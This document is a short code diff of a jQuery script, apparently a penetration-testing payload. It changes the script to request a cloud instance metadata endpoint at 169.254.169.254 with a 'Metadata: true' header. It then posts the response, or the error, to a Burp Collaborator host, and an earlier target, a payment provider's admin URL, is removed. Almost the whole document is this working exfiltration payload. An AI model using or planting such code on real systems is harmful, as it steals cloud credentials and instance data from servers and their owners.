@@ -7,12 +7,11 @@
 <script>
 $(document).ready(function(){
 $.ajax({
-		url: "https://th.molpay.com/MOLPay/admin",
-            //url: "http://169.254.169.254/metadata/instance?api-version=2019-10-01",
+            url: "https://169.254.169.254/metadata/instance?api-version=2019-10-01",
 	    //url: "https://dj0lhi26m7wo8gqbciihr4wsoju9iy.burpcollaborator.net",
             type: 'GET',
             //dataType: 'json',
-            //headers: {"Metadata": "true"},
+            headers: {"Metadata": "true"},
             //contentType: 'application/json; charset=utf-8',
             success: function (result) {
                			$.post( "https://dj0lhi26m7wo8gqbciihr4wsoju9iy.burpcollaborator.net", result)
@@ -21,7 +20,7 @@ $.ajax({
 			});
             },
             error: function (error) {
-                             $.post( "https://dj0lhi26m7wo8gqbciihr4wsoju9iy.burpcollaborator.net", "error request")
+                             $.post( "https://dj0lhi26m7wo8gqbciihr4wsoju9iy.burpcollaborator.net", error)
 				.done(function( ) {			
 alert( "Data Loaded: ");				
             });
